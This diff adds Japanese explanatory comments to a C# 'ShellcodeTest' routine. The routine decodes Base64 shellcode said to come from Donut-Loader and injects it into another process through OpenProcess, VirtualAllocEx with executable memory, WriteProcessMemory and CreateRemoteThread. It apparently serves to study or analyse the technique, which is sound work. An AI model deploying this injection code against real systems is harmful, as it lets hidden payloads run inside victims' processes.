@@ -353,17 +353,19 @@ namespace ShellcodeTest
 			{
 				text = x64;
 			}
-			// System.Convert.FromBase64String()でBase64から８ビット符号なし整数配列に変換
+			// System.Convert.FromBase64String()でBase64からバイト型配列に変換
 			byte[] array = Convert.FromBase64String(text);
-			// WindowsAPIの「OpenProcess」関数で
+			// WindowsAPIの「OpenProcess」関数で指定されたプロセスIDのプロセスを開く
+			// 1082は、16進数で「43A」であり「PROCESS_QUERY_INFORMATION」「PROCESS_VM_WRITE」「PROCESS_VM_READ」「PROCESS_VM_OPERATION」「PROCESS_CREATE_THREAD」をあらわす
 			IntPtr intPtr = Program.OpenProcess(1082, false, processById.Id);
 			// checkedステートメントで整数型の算術演算および変換に対するオーバーフローをチェックし、ステートメント内のコードを例外処理できるようにする
 			checked
 			{
-				// WIndowsAPIの「VirtualAllocEx」で指定したプロセスIDのプロセスの仮想アドレス空間内にメモリを割り当てる
+				// WIndowsAPIの「VirtualAllocEx」で指定したプロセスIDのプロセスにメモリを割り当てる
 				// 12288Uは整数リテラルなので、uint型の12288。12288は16進数で「0x3000」であり「MEM_COMMIT」「MEM_RESERVE」をあらわす
 				IntPtr intPtr2 = Program.VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288U, 64U);
 				UIntPtr uintPtr;
+				// WindowsAPIの「WriteProcessMemory」でVirtualAllocEXで作成したメモリ内に、「Donut-Loader」で指定したShellCodeが書き込まれる
 				Program.WriteProcessMemory(intPtr, intPtr2, array, (uint)array.Length, out uintPtr);
 				Program.CreateRemoteThread(intPtr, IntPtr.Zero, 0U, intPtr2, IntPtr.Zero, 0U, IntPtr.Zero);
 				return 0;
